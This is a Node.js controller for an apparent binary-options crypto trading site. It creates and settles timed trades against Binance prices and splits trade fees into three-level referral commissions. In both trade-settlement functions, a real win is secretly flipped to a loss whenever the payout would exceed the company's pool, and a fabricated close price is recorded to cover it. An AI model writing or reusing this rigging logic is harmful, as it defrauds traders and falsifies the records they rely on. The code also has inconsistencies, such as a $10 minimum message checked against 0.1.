const ErrorHandler = require('../utils/errorhandler');
const catchAsyncErrors = require('../middleware/catchAsyncErrors');
const User = require('../models/userModel');
const Company = require('../models/companyModel');
const companyId = process.env.COMPANY_ID;
const Trade = require('../models/tradeModel');
const TradeRecord = require('../models/tradeRecord');
const createTransaction = require('../utils/tnx');
const axios = require('axios');

// create trade
exports.createTrade = catchAsyncErrors(async (req, res, next) => {
	const id = req.user._id;
	const { amount, trade_type, open_price, symbol, time } = req.body;

	if (amount < 0.1) {
		return next(new ErrorHandler('Minimum trade amount is $10', 400));
	}

	if (!trade_type) {
		return next(new ErrorHandler('Trade type is required', 400));
	}

	if (!open_price) {
		return next(new ErrorHandler('Open price is required', 400));
	}

	// find user
	const user = await User.findById(id);
	if (!user) {
		return next(new ErrorHandler('User not found', 404));
	}

	// check if user has enough balance
	if (user.m_balance < amount) {
		return next(new ErrorHandler('Insufficient balance', 400));
	}

	// find parent_1
	const parent_1 = await User.findOne({
		customer_id: user.parent_1.customer_id,
	}).select('m_balance trade_com');

	if (!parent_1) {
		return next(new ErrorHandler('Parent 1 not found', 404));
	}

	// find parent_2
	const parent_2 = await User.findOne({
		customer_id: user.parent_2.customer_id,
	}).select('m_balance trade_com');

	if (!parent_2) {
		return next(new ErrorHandler('Parent 2 not found', 404));
	}

	// find parent_3
	const parent_3 = await User.findOne({
		customer_id: user.parent_3.customer_id,
	}).select('m_balance trade_com');

	if (!parent_3) {
		return next(new ErrorHandler('Parent 3 not found', 404));
	}

	// find trade record by user id if not found create one
	let tradeRecord = null;
	let existRecord = await TradeRecord.findOne({ user_id: id });
	if (existRecord) {
		tradeRecord = existRecord;
	} else {
		tradeRecord = await TradeRecord.create({
			user_id: id,
			customer_id: user.customer_id,
			name: user.name,
		});
	}

	// find company
	const company = await Company.findById(companyId);
	if (!company) {
		return next(new ErrorHandler('Company not found', 404));
	}

	// console.log(open_price);
	const trade_charge = amount * 0.02;
	const trade_amount = amount - trade_charge;

	// update user balance
	user.m_balance -= amount;

	// create trade
	const trade = await Trade.create({
		user_id: id,
		customer_id: user.customer_id,
		amount,
		trade_charge,
		trade_amount,
		trade_type,
		open_price,
		open_time: new Date(),
		symbol,
		duration: time,
	});

	if (user.trading_volume > 0) {
		user.trading_volume -= amount;
	}

	if (user.trading_volume === 0) {
		user.active_balance = user.m_balance;
	}

	user.active_trade += 1;
	await user.save();

	// update tradeRecord
	tradeRecord.total_trade_amount += trade_amount;
	await tradeRecord.save();

	// update parent_1
	parent_1.m_balance += trade_charge * 0.3;
	parent_1.trade_com.level_1 += trade_charge * 0.3;
	createTransaction(
		parent_1._id,
		'cashIn',
		trade_charge * 0.3,
		'trade_commission',
		`1st level Trade Commission from ${user.username}`
	);
	await parent_1.save();

	// update parent_2
	parent_2.m_balance += trade_charge * 0.2;
	parent_2.trade_com.level_2 += trade_charge * 0.2;
	createTransaction(
		parent_2._id,
		'cashIn',
		trade_charge * 0.2,
		'trade_commission',
		`2nd level Trade Commission from ${user.username}`
	);

	await parent_2.save();

	// update parent_3
	parent_3.m_balance += trade_charge * 0.1;
	parent_3.trade_com.level_3 += trade_charge * 0.1;
	createTransaction(
		parent_3._id,
		'cashIn',
		trade_charge * 0.1,
		'trade_commission',
		`3rd level Trade Commission from ${user.username}`
	);
	await parent_3.save();

	const total_trade_charge = trade_charge * 0.6;
	//update company
	company.total_trade_amount += trade_amount;
	company.game.trading_charge += trade_charge;
	company.game.trading_profit += trade_charge * 0.4;
	company.game.game_profit += trade_charge * 0.4;
	company.total_profit += trade_charge * 0.4;
	company.game.game_cost += total_trade_charge;
	await company.save();

	setTimeout(async () => {
		await updateTrade(trade);
	}, time);

	res.status(200).json({
		success: true,
		message: 'Trade created successfully',
		trade,
	});
});

const MAX_RETRIES = 10;

const updateTrade = async (trade, retryCount = 0) => {
	if (retryCount >= MAX_RETRIES) {
		console.log('Max retries reached. Unable to get price.');
		return;
	}

	let close_price = 0;
	let response;
	console.log('Retrying...', retryCount);
	try {
		response = await axios.get(
			`https://api4.binance.com/api/v3/ticker/price?symbol=${trade.symbol}`
		);

		console.log('response', response.data.price);

		if (response) {
			close_price = response.data.price;
		} else {
			console.log('Error getting price');
		}
	} catch (error) {
		console.log('Error getting price. Retrying...');
		// Retry after a delay
		setTimeout(async () => {
			await updateTrade(trade, retryCount + 1);
		}, 1000); // Wait for 1 second before retrying
		return;
	}

	// find user by trade.user_id
	const user = await User.findById(trade.user_id);
	if (!user) {
		console.log('User not found');
	}

	// find trade record by user id
	const tradeRecord = await TradeRecord.findOne({ user_id: user._id });
	if (!tradeRecord) {
		console.log('Trade record not found');
	}

	// find company
	const company = await Company.findById(companyId).select(
		'total_trade_amount game'
	);
	if (!company) {
		console.log('Company not found');
	}

	let result = null;

	if (trade.trade_type === 'up') {
		if (close_price > trade.open_price) {
			result = 'win';
		} else {
			result = 'loss';
		}
	} else {
		if (close_price < trade.open_price) {
			result = 'win';
		} else {
			result = 'loss';
		}
	}

	console.log('result1 Ori', result);

	let profit = 0;
	let totalProfit = 0;
	const globalTradeAmount = company.total_trade_amount - 50;

	if (result === 'win') {
		profit = trade.trade_amount * 0.85;
		totalProfit = trade.trade_amount + profit;
		console.log(totalProfit > globalTradeAmount);
		if (totalProfit > globalTradeAmount) {
			result = 'loss';

			if (trade.trade_type === 'up') {
				trade.close_price = trade.open_price - 1;
			} else {
				trade.close_price = trade.open_price + 1;
			}
		} else {
			trade.close_price = close_price;
		}
	} else {
		trade.close_price = close_price;
	}

	console.log('result2 Cus', result);

	// update trade

	trade.close_time = new Date();
	trade.duration = (trade.close_time - trade.open_time) / 1000;
	trade.profit = totalProfit;
	trade.loss = trade.trade_amount;
	trade.status = 'closed';
	trade.result = result;
	is_active = false;
	await trade.save();
	console.log('Updated trade', trade.close_price);
	// update tradeRecord
	if (result === 'win') {
		tradeRecord.total_profit += profit;
		// update company total_trade_amount
		company.total_trade_amount -= totalProfit;
		company.game.game_cost += totalProfit;
		// update user m_balance
		user.m_balance += totalProfit;
	} else {
		tradeRecord.total_loss += trade.amount;
	}

	user.active_trade -= 1;
	await user.save();

	tradeRecord.last_trade_id = trade._id;
	await tradeRecord.save();

	// update company
	await company.save();

	console.log('Trade updated successfully');

	const ioData = {
		symbol: trade.symbol,
		open_price: trade.open_price,
		close_price: trade.close_price,
		trade_amount: trade.trade_amount,
		trade_type: trade.trade_type,
		result: trade.result,
		profit: trade.profit,
		loss: trade.loss,
		user_id: trade.user_id,
		massage: 'Trade updated successfully',
	};
	// socket io for participants
	global.io.emit('trade-pop', ioData);
};

// update trade
exports.updateTrade = catchAsyncErrors(async (req, res, next) => {
	const user = req.user;
	let close_price = 0;

	const response = await axios.get(
		'https://api4.binance.com/api/v3/ticker/price?symbol=BTCUSDT'
	);
	if (response) {
		close_price = response.data.price;
	} else {
		console.log('Error getting price');
		return next(new ErrorHandler('Error getting price', 400));
	}

	// find trade by user._id
	const trade = await Trade.findOne({ user_id: user._id }).sort({
		createdAt: -1,
	});
	if (!trade) {
		return next(new ErrorHandler('Trade not found', 404));
	}

	// find trade record by user id
	const tradeRecord = await TradeRecord.findOne({ user_id: user._id });
	if (!tradeRecord) {
		return next(new ErrorHandler('Trade record not found', 404));
	}

	// find company
	const company = await Company.findById(companyId).select(
		'total_trade_amount game'
	);
	if (!company) {
		return next(new ErrorHandler('Company not found', 404));
	}

	console.log('open price', trade.open_price, 'close price', close_price);
	console.log('Trade Type', trade.trade_type);

	let result = null;
	let profit = 0;
	let totalProfit = 0;
	const globalTradeAmount = company.total_trade_amount + 10;

	if (trade.trade_type === 'up') {
		if (close_price > trade.open_price) {
			result = 'win';
		} else {
			result = 'loss';
		}
	} else {
		if (close_price < trade.open_price) {
			result = 'win';
		} else {
			result = 'loss';
		}
	}

	console.log('result1 Ori', result);

	if (result === 'win') {
		profit = trade.trade_amount * 0.85;
		totalProfit = trade.trade_amount + profit;
		console.log(totalProfit > globalTradeAmount);
		if (totalProfit > globalTradeAmount) {
			result = 'loss';

			if (trade.trade_type === 'up') {
				trade.close_price = trade.open_price - 1;
			} else {
				trade.close_price = trade.open_price + 1;
			}
		} else {
			trade.close_price = close_price;
		}
	} else {
		trade.close_price = close_price;
	}

	console.log('result2 Cus', result);

	// update trade

	trade.close_time = new Date();
	trade.duration = (trade.close_time - trade.open_time) / 1000;
	trade.profit = totalProfit;
	trade.loss = trade.trade_amount;
	trade.status = 'closed';
	trade.result = result;
	is_active = false;
	await trade.save();
	console.log('Updated trade', trade.close_price);
	// update tradeRecord
	if (result === 'win') {
		tradeRecord.total_profit += profit;
		// update company total_trade_amount
		company.total_trade_amount -= totalProfit;
		company.game.game_cost += totalProfit;
		// update user m_balance
		user.m_balance += totalProfit;

		await user.save();
	} else {
		tradeRecord.total_loss += trade.amount;
	}

	tradeRecord.last_trade_id = trade._id;
	await tradeRecord.save();

	// update company
	await company.save();

	res.status(200).json({
		success: true,
		message: 'Trade updated successfully',
		trade,
	});
});

// logged in user trades
exports.myTrades = catchAsyncErrors(async (req, res, next) => {
	const user = req.user;
	const trades = await Trade.find({ user_id: user._id }).sort({
		createdAt: -1,
	});

	res.status(200).json({
		success: true,
		trades,
	});
});
